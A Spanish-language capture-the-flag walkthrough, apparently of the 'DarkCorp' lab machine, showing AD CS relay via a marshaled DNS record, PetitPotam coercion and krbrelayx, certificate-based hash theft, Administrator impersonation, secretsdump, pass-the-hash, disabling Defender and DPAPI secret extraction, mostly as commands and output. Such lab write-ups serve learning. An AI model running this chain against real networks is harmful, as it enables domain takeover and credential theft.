Este servicio permite a un cliente enviar una solicitud de certificado a través de una interfaz web (normalmente `http://<ca_server>/certsrv/` o `https://<ca_server>/certsrv/`).

Estos servicios web `HTTP(S)` de `AD CS` son vulnerables si se cumplen las siguientes condiciones:

- Aceptar autenticación `NTLM`: El servidor aloja esos servicios en un servidor web (`IIS` o uno dedicado) de la `CA` (`Certificate Authority`).
- Falta de protecciones `NTLM`:  El equipo en cuestión no aplica protecciones contra `NTLM Relay`, como `EPA` (también conocida como `Channel Binding`).

> [`EPA`](https://www.thehacker.recipes/ad/movement/ntlm/relay#epa-extended-protection-for-auth) (`Extended Protection for Authentication`) es una característica de seguridad de Windows que protege una red contra ataques de retransmisión (`Relay`) y suplantación de identidad (`Spoofing`).
{: .notice--info}

> Simplemente usando `HTTPS` es **insuficiente** para prevenir ataques de retransmisión si `EPA` no está correctamente configurado.
{: .notice--danger}

Suplantando la identidad del usuario víctima, un atacante podría solicitar un certificado de autenticación de cliente basado en las plantillas de certificado `User` o `Machine`. ([`specterops.io`](https://specterops.io/blog/2021/06/17/certified-pre-owned/#48bd:~:text=While%20impersonating%20the%20victim%20user%2C%20an%20attacker%20could%20access%20these%20web%20interfaces%20and%20request%20a%20client%20authentication%20certificate%20based%20on%20the%C2%A0User%C2%A0or%C2%A0Machine%C2%A0certificate%20templates))

#### Attack Steps

Los pasos para llevar a cabo este ataque generalmente siguen la siguiente estructura:

1. El atacante obliga a una cuenta privilegiada a autenticarse en una máquina controlada por el atacante mediante `NTLM` (`Coerced Authentication`).

2. El atacante utiliza una herramienta de retransmisión `NTLM` para escuchar las autenticaciones `NTLM` entrantes, como `ntlmrelayx.py`.

3. Cuando la cuenta víctima se autentica, la herramienta captura y reenvía esta autenticación hacia el endpoint de inscripción web vulnerable de `AD CS` (por ejemplo, `https://<CA_SERVER>/certsrv/certfnsh.asp`).

4. El servicio web toma esta autenticación como legítima, por lo que procesa las solicitudes de inscripción como si fuera la cuenta víctima.
	1. El atacante solicita un certificado aprovechando esta autenticación, especificando una plantilla donde la cuenta tenga derechos de inscripción (como `User` o `Machine`).

5. La `CA` emite el certificado y el atacante lo recibe como un archivo `.pfx`.

6. El atacante puede utilizar este certificado para autenticarse como el usuario víctima usando `PKINIT` y obtener sus credenciales.

### Scenario

En este caso, la configuración de la `CA` nos dice que `Web Enrollment` se encuentra habilitado por `HTTPS`, pero no se logró identificar la configuración de `EPA`

``` bash
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
```

Podemos verificarla usando la herramienta `netexec`, donde en la parte del Banner notaremos que `LDAP` no está firmado

``` bash
nxc ldap  "$DC_IP" -u 'victor.r' -p 'victor1gustavo@#'                
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb) (signing:None) (channel binding:Never)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
```


### Exploiting

#### Add DNS Record

Si intentamos añadir un nuevo registro `DNS` con las credenciales de `victor.r`, notaremos que no disponemos de permisos suficientes (`INSUFF_ACCESS_RIGHTS`)

``` bash
bloodyAD --host "$FQDN" -d "$DOMAIN" -u 'victor.r' -p 'victor1gustavo@#' add dnsRecord dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.30
Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 334, in dnsRecord
    conn.ldap.bloodyadd(record_dn, attributes=record_attr)
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 213, in bloodyadd
    raise err
msldap.commons.exceptions.LDAPAddException: LDAP Add operation failed on DN DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00000005: SecErr: DSID-03152E29, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

Al intentar registrar un nuevo registro `DNS` personalizado, veremos algunos errores con el formato de nombre

``` bash
uv run examples/ntlmrelayx.py -t ldap://172.16.20.1/ --no-smb-server --no-validate-privs --no-acl --add-dns-record 'web-02.darkcorp.htb' 10.10.15.30

Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections

[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://172.16.20.1
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://172.16.20.1 SUCCEED [1]
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Assuming relayed user has privileges to escalate a user via ACL attack
[-] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Invalid name for DNS record
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Dumping domain info for first time
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Domain info dumped into lootdir!
```

> Recibimos autenticación como la cuenta `svc_acc`. Si consultamos en BloodHound, veremos que se trata de una cuenta de servicio y es miembro de `DnsAdmins`.
{: .notice--warning}

Frente a este problema, podemos intentar utilizar la técnica descrita en el [siguiente artículo](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html#:~:text=Marshaled%20Target%20Information%20SPN) de `James Forshaw`, la cual consiste en abusar del procesamiento de los `SPN` (`Service Principal Name`) en Active Directory.

La técnica menciona que ciertas funciones de Windows como [`SecMakeSPNEx2`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-secmakespnex2) construyen un `SPN` no tan solo con una cadena estándar, sino que concatenan una esctructura de datos binarios ([`CREDENTIAL_TARGET_INFORMATION`](https://learn.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationa)) codificada en una variante de `base64`.

El resultado de este proceso es un SPN que luce más o menos como el siguiente

``` bash
cifs/target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA
```

En su artículo menciona las [limitaciones de caracteres en `DNS`](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html#:~:text=Another%20issue,exploit), lo que limita el ataque a nombres NetBIOS cortos. 

> En este caso no será un problema porque tenemos opciones como `DC-01`, el cual solo posee `5` caracteres.
{: .notice--primary}

Finalmente, el registro `DNS` que podemos utilizar para explotar la técnica de `Marshal DNS` luce de la siguietne manera

``` bash
dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Iniciaremos la herramienta `ntlmrelayx` con algunos parámetros para omitr comprobaciones y funcionalidades innecesarias, añadiendo el registro `DNS` malicioso con `--add-dns-record`

``` bash
uv run examples/ntlmrelayx.py -t ldap://172.16.20.1/ --no-smb-server --no-validate-privs --no-acl --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.15.30

Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Ahora haremos clic en `Check!` desde la web para activar el ataque. Nuestro listener capturará la conexión y la cuenta víctima tramitará el registro `DNS` malicioso por nosotros

``` bash
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://172.16.20.1
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://172.16.20.1 SUCCEED [1]
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Assuming relayed user has privileges to escalate a user via ACL attack
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.15.30` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Dumping domain info for first time
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Domain info dumped into lootdir!
```

A modo de verificar este nuevo registro, podemos hacer una consulta `DNS` rápidamente usando `dig` o `nslookup`

``` bash
dig @"$DOMAIN" dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb              

; <<>> DiG 9.10.6 <<>> @darkcorp.htb dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27600
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb.	IN A

;; ANSWER SECTION:
dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb.	60 IN A	10.10.15.30

;; Query time: 287 msec
;; SERVER: 172.16.20.1#53(172.16.20.1)
;; WHEN: Fri May 29 18:58:41 -04 2026
;; MSG SIZE  rcvd: 107
```

#### Kerberos Relay

Ya deberíamos ser capaces de forzar la autenticación desde una máquina del dominio. Iniciaremos `krbrelayx` apuntando al endpoint de inscripción web

``` bash
krbrelayx.py -t https://DC-01.darkcorp.htb/certsrv/certfnsh.asp --adcs --template Machine -v 'WEB-01$'

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80

[*] Setting up DNS Server
[*] Servers started, waiting for connections
```

- `-t`: URL hacia el endpoint de inscripción de certificados.
- `-v`: Nombre de la cuenta víctima para identificar el certificado

Ahora iniciaremos una herramienta de coerción como `PetitPotam` para forzar la autenticación de `WEB-01` en nuestro listener

``` bash
petitpotam.py -d "$DOMAIN" -u 'victor.r' -p 'victor1gustavo@#' dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA WEB-01.darkcorp.htb

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:WEB-01.darkcorp.htb[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Desde nuestro listener con `krbrelayx` recibiremos la autenticación, en ese mismo instante solicitará un certificado en nombre de la cuenta de equipo `WEB-01$`

``` bash
[*] SMBD: Received connection from 127.0.0.1
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 127.0.0.1
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 6
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
[*] Certificate successfully written to file
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user WEB-01$ since attack was already performed
```

Podemos utilizar este certificado para autenticarnos vía `PKINIT` al DC y así obtener las credenciales de la cuenta `WEB-01$`

``` bash
certipy auth -pfx WEB-01\$.pfx -domain "$DOMAIN" -dc-ip "$DC_IP"    
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

Finalmente, podemos utilizar el hash NT o las credenciales en caché para obtener un ticket de servicio suplantando al usuario `Administrator`

``` bash
faketime "$(ntpdate -q $DC_IP | cut -d ' ' -f 1,2)" zsh 
export KRB5CCNAME="$(pwd)/web-01.ccache"

getST.py -altservice CIFS/WEB-01.darkcorp.htb -self -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/'WEB-01$' -k -no-pass
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Changing service from WEB-01$@DARKCORP.HTB to CIFS/WEB-01.darkcorp.htb@DARKCORP.HTB
[*] Saving ticket in Administrator@CIFS_WEB-01.darkcorp.htb@DARKCORP.HTB.ccache
```

Cargaremos el ticket en la variable `KRB5CCNAME`, y posteriormente podremos dumpear los hashes del host `WEB-01` con la herramienta `secretsdump`

``` bash
export KRB5CCNAME="$(pwd)/Administrator@CIFS_WEB-01.darkcorp.htb@DARKCORP.HTB.ccache"

secretsdump.py -k -no-pass WEB-01.darkcorp.htb      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x4cf6d0e998d53752d088e233abb4bed6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DARKCORP.HTB/svc_acc:$DCC2$10240#svc_acc#3a5485946a63220d3c4b118b36361dbb: (2026-05-29 19:43:07)
```


## Shell as `Administrator` - `WEB-01`

Con el hash `NT` del usuario `Administrator` del host `WEB-01`, podemos hacer `PassTheHash` para conectarnos vía `WinRM` con una consola de `powershell`

``` bash
evil-winrm-py -i 172.16.20.2 -u Administrator -H '88d84ec08dad123eb04a060a74053f21'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '172.16.20.2:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
web-01\administrator
```

Ya podremos ver la flag del usuario sin privilegios, la cual se ubica en el escitorio del usuario `Administrator` en esta máquina

``` bash
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\user.txt
a0c...
```
<br>


# Escalada de Privilegios
---
## System Enumeration

Ahora que tenemos acceso administrativo en el host `WEB-01`, procederemos a lanzar una herramienta de enumeración como `winPEAS`, con el fin de buscar alguna vía que nos permita acceder al host `DC-01`

### Defender

Aunque si lanzamos una herramienta, Windows Defender la bloquea por firma

``` bash
evil-winrm-py PS C:\Programdata> .\winPEASany.exe
.\winPEASany.exe: Operation did not complete successfully because the file contains a virus or potentially unwanted software.

At line:1 char:1

+ .\winPEASany.exe

+ ~~~~~~~~~~~~~

    + CategoryInfo          : ObjectNotFound: (:String) [], CommandNotFoundException

    + FullyQualifiedErrorId : CommandNotFoundException
```

Para deshabilitar el `Defender`, podemos utilizar el siguiente comando que desactiva el monitoreo en tiempo real (requiere privilegios de `Administrator`)

``` bash
evil-winrm-py PS C:\Programdata> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell Modules

Al listar módulos de `Powershell`, notaremos que está instalado uno llamado `CredentialManager`.

> Los módulos de `PowerShell` son paquetes de código reutilizables que contienen cmdlets, funciones, variables y scripts.
{: .notice--info}

``` powershell
evil-winrm-py PS C:\Users\Administrator\Documents> Get-Module -ListAvailable

    Directory: C:\Program Files\WindowsPowerShell\Modules

ModuleType Version    Name                                ExportedCommands                                              
---------- -------    ----                                ----------------                                              
Binary     2.0        CredentialManager                   {Get-StoredCredential, New-StoredCredential, Remove-StoredC...
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}         
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packag...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}                            
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}  
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remove...

    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules

ModuleType Version    Name                                ExportedCommands                                              
---------- -------    ----                                ----------------                                              
Manifest   2.0.0.0    AppLocker                           {Get-AppLockerFileInformation, Get-AppLockerPolicy, New-App...

<SNIP>
```

### DPAPI Secrets

> **DPAPI** (`Data Protection API`) es una API de cifrado integrada en Windows que permite proteger datos sensibles (como contraseñas, claves y credenciales) de forma automática, utilizando las credenciales del usuario o del sistema.
{: .notice--info}

DPAPI protege los datos utilizando una `master key`, normalmente cifrada con las credenciales del usuario en formato hash.

El [abuso o lectura de secretos DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) es una técnica de post-explotación que logra obtener información sensible protegida por DPAPI. 

Para descifrar datos protegidos por esta funcionalidad de Windows necesitamos extraer los siguientes archivos:

- `Master Key`: Clave maestra, la necesitaremos para desencriptar credenciales.
- `Credential File`: Archivo de credenciales protegidas por DPAPI.

Los datos se almacenan en el directorio de usuarios y están protegidos por esta clave maestra. Normalmente se encuentran el la siguiente carpeta

~~~ powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
~~~

Los datos protegidos suelen encontrarse dentro de los siguientes carpetas del usuario

~~~ powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
~~~

### Master Key

Vemos algunos archivos de clave maestra almacenads dentro de la carpeta `C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500`, aunque están protegidos por Windows.

> Aunque de primeras no tenemos del todo claro cuál es el de clave maestra.
{: .notice--danger}

``` bash
evil-winrm-py PS C:\Programdata> dir C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500 -Force

    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-hs-         1/15/2025   4:11 PM            468 189c6409-5515-4114-81d2-6dde4d6912ce                                  
-a-hs-         1/16/2025  10:35 AM            468 6037d071-cac5-481e-9e08-c4296c0a7ff7                                  
-a-hs-         5/29/2026  10:35 AM            468 9d2ed2ba-f3c1-4150-838d-6e880309f7d4                                  
-a-hs-         5/29/2026  10:35 AM             24 Preferred  
```

### Credential

El archivo. de credencial lo encontraremos bajo la ruta `C:\Users\Administrator\AppData\Local\Microsoft\Credentials\`, aunque está oculto porque es un archivo protegido por Windows

``` bash
evil-winrm-py PS C:\Programdata> dir C:\Users\Administrator\AppData\Local\Microsoft\Credentials\ -Force


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-hs-         1/16/2025  11:01 AM            560 32B2774DF751FF7E28E78AE75C237A1E                                      
```

Descargaremos el archivo de clave maestra y el archivo de credencial

``` bash
evil-winrm-py PS C:\Users\Administrator\Documents> download C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500\6037d071-cac5-481e-9e08-c4296c0a7ff7 .
```

Antes de descargar el archivo de credencial, necesitamos eliminar ciertos atributos que contiene

``` powershell
evil-winrm-py PS C:\Users\Administrator\Documents> attrib -h -s C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E


evil-winrm-py PS C:\Programdata> download C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E .
```

- `-h`: Eliminar el atributo `hidden` (oculto) del archivo.
- `-s`: Eliminar el atributo `system`, que marca el archivo como protegido por Windows.

> Tip: Podemos usar mimikatz para saber qué `Master Key` se necesita para descifrar ese blob.
{: .notice--primary}

``` powershell
evil-winrm-py PS C:\Programdata> .\mimikatz.exe "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {6037d071-cac5-481e-9e08-c4296c0a7ff7} # This
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

<SNIP>
```

Ahora que sabemos exactamente qué archivo de `Mastery Key` necesitamos, lo descargaremos en nuestra máquina de atacante

> Al igual que con el archivo de credencial, quitamos los atributos `hidden` y `system` y descargamos el archivo.
{: .notice--warning}

``` powershell
evil-winrm-py PS C:\Users\Administrator\Documents> attrib -h -s C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541
228647-500\6037d071-cac5-481e-9e08-c4296c0a7ff7

evil-winrm-py PS C:\Users\Administrator\Documents> download C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-25412286
47-500\6037d071-cac5-481e-9e08-c4296c0a7ff7 .
```

### Dump Secrets Via Netexec

Actualmente tenemos el hash NT del usuario `Administrator` local, podemos dumpear los secretos DPAPI sin conocer la contraseña.

`Netexec` es capaz de automatizar todo el proceso de extracción y descifrado de secretos

``` bash
nxc smb 172.16.20.2 -u Administrator -H '88d84ec08dad123eb04a060a74053f21' --local-auth --dpapi         
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:WEB-01) (signing:False) (SMBv1:None)
SMB         172.16.20.2     445    WEB-01           [+] WEB-01\Administrator:88d84ec08dad123eb04a060a74053f21 (Pwn3d!)
SMB         172.16.20.2     445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.20.2     445    WEB-01           [+] Got 6 decrypted masterkeys. Looting secrets...
SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

En este caso encontró una credencial guardada por el Programador de Tareas: `But_Lying_Aid9!`. Esta credencial parece ser la contraseña de la cuenta `Administrator` local en el host `WEB-01`

``` bash
nxc smb 172.16.20.2 -u Administrator -p 'But_Lying_Aid9!' --local-auth        
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:WEB-01) (signing:False) (SMBv1:None)
SMB         172.16.20.2     445    WEB-01           [+] WEB-01\Administrator:But_Lying_Aid9! (Pwn3d!)
```

### Decrypt Credential Via Impacket

Herramientas como `dpapi.py` de `impacket` nos permiten descifrar secretos DPAPI. Para esto debemos conocer la contraseña del usuario.

> Utilizaremos la contraseña que encontramos del usuario `Administrator` para descifrar los secretos.
{: .notice--warning}

``` bash
dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500 -password 'But_Lying_Aid9!' 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 6037d071-cac5-481e-9e08-c4296c0a7ff7
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da
```

Ahora que desciframos la `Master Key`, procederemos a descifrar la credencial de la siguiente manera

``` bash
dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-16 19:01:39
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
